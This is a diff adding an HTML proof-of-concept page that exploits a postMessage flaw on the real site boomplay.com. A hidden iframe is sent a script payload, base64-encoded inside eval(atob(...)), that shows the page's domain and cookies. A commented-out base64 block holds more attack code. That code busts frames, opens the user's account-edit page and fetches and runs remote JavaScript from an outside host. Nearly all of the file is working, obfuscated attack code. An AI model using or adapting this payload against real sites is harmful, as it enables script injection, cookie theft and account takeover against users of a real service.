@@ -1,0 +1,34 @@
+<html>
+
+<head>
+    <title>POC for Boomplay.com PostMessage vulnerability</title>
+</head>
+
+<body>
+    <script>
+        let boom = "https://www.boomplay.com/ad_iframe";
+        let frame = document.createElement("iframe");
+        frame.src = `${boom}`;
+        frame.width = `100%`;
+        frame.height = `100%`;
+        frame.style.display = "none";
+        frame.onload = () => {
+            frame.contentWindow.postMessage({
+                type: "ad_iframe",
+                data: {
+                    source: "BP",
+                    bpData: {
+                        scriptContent: { script: "<script>eval(atob('YWxlcnQoIkFsZXJ0IGZyb20gdGhlIGRvbWFpbiA6ICIrZG9jdW1lbnQuZG9tYWluICsgIlxuIisgIkNvb2tpZXMgOiAiKyBkb2N1bWVudC5jb29raWUp'));<\/script>" }
+                    },
+                    lmxType: "JSCode"
+                }
+            }, "*");
+        }
+        document.body.appendChild(frame);
+
+        /*
+dmFyIGtpbGxfYnVzdCA9IDAKd2luZG93Lm9uYmVmb3JldW5sb2FkID0gZnVuY3Rpb24oKSB7a2lsbF9idXN0KysgfQpzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICBpZiAoa2lsbF9idXN0ID4gMCkgewogICAga2lsbF9idXN0IC09IDI7CiAgICB3aW5kb3cudG9wLmxvY2F0aW9uID0gJ2h0dHBzOi8vaHR0cHN0YXQudXMvMjA0JwogIH0KfSwgMSk7Cgp2YXIgbG9naW5JZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTsKbG9naW5JZnJhbWUuc2V0QXR0cmlidXRlKCdzcmMnLCAnaHR0cHM6XC9cL3d3dy5ib29tcGxheS5jb21cL3VzZXJDZW50ZXJcL2VkaXQnKTsKbG9naW5JZnJhbWUuc2V0QXR0cmlidXRlKCd3aWR0aCcsICcxMDAlJyk7CmxvZ2luSWZyYW1lLnNldEF0dHJpYnV0ZSgnaGVpZ2h0JywgJzEwMCUnKTsKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChsb2dpbklmcmFtZSk7CgpmdW5jdGlvbiBiKCl7CglldmFsKHRoaXMucmVzcG9uc2VUZXh0KQp9OwphPW5ldyBYTUxIdHRwUmVxdWVzdCgpOwphLmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLCBiKTsKYS5vcGVuKCJHRVQiLCAiaHR0cHM6Ly94c3Mua2hhcmEub25lL2EiKTsKYS5zZW5kKCk7 */
+    </script>
+</body>
+
+</html>
